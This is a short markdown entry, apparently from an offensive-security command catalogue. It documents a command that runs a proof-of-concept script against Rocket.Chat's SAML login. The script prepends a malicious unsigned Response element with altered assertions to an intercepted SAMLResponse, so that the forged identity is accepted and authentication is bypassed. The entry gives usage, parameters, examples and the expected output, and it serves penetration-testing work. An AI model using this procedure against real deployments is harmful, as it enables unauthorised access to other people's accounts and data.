---
data: python3 samlbypasspoc.py <URL_encoded_SAMLResponse>
tags:
  - saml
  - bypass
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 9bf0d0d5-9c65-46b5-938a-17cc09dc5314
created_at: '2025-12-14T17:31:19.328Z'
updated_at: '2025-12-14T17:31:19.328Z'
verified: false
validated: true
submitted: true
---
# samlbypasspoc-modify-response

## Command

```bash
python3 samlbypasspoc.py <URL_encoded_SAMLResponse>
```

## Description

This command runs a Python script to modify a SAMLResponse by prepending a malicious unsigned Response element with altered assertions, exploiting Rocket.Chat's validation flaw for auth bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<URL_encoded_SAMLResponse>` | Base64 URL-encoded original SAMLResponse from intercepted request | Yes |

## Examples

### Basic Usage

```bash
python3 samlbypasspoc.py PHNhbWw6UmVzcG9uc2U+e... (truncated encoded string)
```

### Advanced Usage

Edit script first for custom assertions, then:

```bash
python3 samlbypasspoc.py <encoded_input> > modified_output.txt
```

## Expected Output

New URL-encoded SAMLResponse printed to stdout, with XML containing malicious Response first, followed by original signed one. Example: PHNhbWw6UmVzcG9uc2U+PG1hbGljaW91cz4... (long encoded string).

## Related

- [[Related Procedure]]
